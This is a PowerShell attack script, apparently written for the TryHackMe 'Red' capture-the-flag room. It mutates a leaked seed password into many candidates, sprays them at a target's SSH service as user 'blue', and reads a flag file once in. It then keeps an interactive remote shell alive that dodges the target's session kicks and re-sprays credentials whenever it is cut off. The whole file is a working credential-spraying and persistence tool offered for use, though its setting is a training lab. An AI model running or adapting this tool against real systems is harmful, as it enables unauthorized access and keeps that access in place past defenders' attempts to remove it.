<#
.SYNOPSIS
    Rotation-proof pseudo-shell for TryHackMe "Red". Sprays best64 variants of
    the leaked seed to land a live SSH session as `blue`, then gives you an
    interactive prompt. Every command runs via a fresh non-interactive exec
    (which also dodges the "kick" that targets interactive bash), and if the
    session dies (rotation or kick) it silently re-sprays a new password and
    keeps going. Auto-reads flag1 on connect.
.USAGE
    .\shell_red.ps1 -Target 10.146.184.99 -Seed 'sup3r_p@s$w0rd!'
    then type shell commands at the  blue@red$  prompt.  'exit' to quit.
#>
param(
    [Parameter(Mandatory=$true)][string]$Target,
    [string]$User    = 'blue',
    [string]$Seed    = 'sup3r_p@s$w0rd!',
    [int]$Rounds     = 6,
    [int]$DelayMs    = 250
)

if (-not (Get-Module -ListAvailable -Name Posh-SSH)) { Install-Module Posh-SSH -Scope CurrentUser -Force -AllowClobber }
Import-Module Posh-SSH -ErrorAction Stop

function Get-Candidates {
    param([string]$w)
    $o=[System.Collections.Generic.List[string]]::new(); $add={param($s) if($s -and -not $o.Contains($s)){$o.Add($s)}}
    & $add $w; & $add $w.ToLower(); & $add $w.ToUpper()
    & $add ((Get-Culture).TextInfo.ToTitleCase($w.ToLower()))
    if($w.Length){ & $add ([char]::ToUpper($w[0])+$w.Substring(1)) }
    foreach($b in @($w,$w.ToLower(),([char]::ToUpper($w[0])+$w.Substring(1)))){
        0..9 | %{ & $add "$b$_" }
        '!','!!','?','.','1','12','123','1234','01','007','2021','2022','2023','2024','2025','@','#','$','_' | %{ & $add "$b$_" }
        & $add "$b$b"
    }
    & $add ($w -replace 'a','@' -replace 'o','0' -replace 'e','3' -replace 's','$' -replace 'i','1')
    & $add ($w -replace '@','a' -replace '0','o' -replace '3','e' -replace '\$','s' -replace '1','i')
    return $o
}
$cands = Get-Candidates $Seed

function Get-LiveSession {
    for($r=1;$r -le $Rounds;$r++){
        Write-Host "[*] spraying for a live password (round $r/$Rounds)..." -ForegroundColor DarkCyan
        foreach($pw in $cands){
            try {
                $s = New-SSHSession -ComputerName $Target -Credential (New-Object PSCredential($User,(ConvertTo-SecureString $pw -AsPlainText -Force))) -AcceptKey -ConnectionTimeout 8 -ErrorAction Stop
                if($s.Connected){ Write-Host "[+] in as $User : $pw" -ForegroundColor Green; return $s }
            } catch {}
            Start-Sleep -Milliseconds $DelayMs
        }
    }
    return $null
}

function Run {
    param($s,[string]$cmd)
    try { $r = Invoke-SSHCommand -SessionId $s.SessionId -Command $cmd -TimeOut 20 -ErrorAction Stop
          return @($r.Output) + @($r.Error) }   # <-- also return stderr
    catch { return $null }
}

$sess = Get-LiveSession
if(-not $sess){ Write-Host "[-] couldn't land a session. widen list / raise -Rounds / check the box is up." -ForegroundColor Yellow; return }

# auto-grab flag1
Write-Host "== flag1 ==" -ForegroundColor Cyan
Run $sess "cat /home/blue/flag1 2>/dev/null; id" | ForEach-Object { Write-Host $_ }

Write-Host "`n[ interactive - type commands, 'exit' to quit. session auto-recovers if kicked ]" -ForegroundColor Cyan
while($true){
    $cmd = Read-Host "$User@red$"
    if($cmd -in @('exit','quit')){ break }
    if(-not $cmd){ continue }
    $out = Run $sess $cmd
    if($null -eq $out){
        Write-Host "[!] session dropped (rotation/kick) - re-spraying..." -ForegroundColor Yellow
        try { Remove-SSHSession -SessionId $sess.SessionId | Out-Null } catch {}
        $sess = Get-LiveSession
        if(-not $sess){ Write-Host "[-] lost the box, stopping." -ForegroundColor Red; break }
        $out = Run $sess $cmd
    }
    $out | ForEach-Object { Write-Host $_ }
}
try { Remove-SSHSession -SessionId $sess.SessionId | Out-Null } catch {}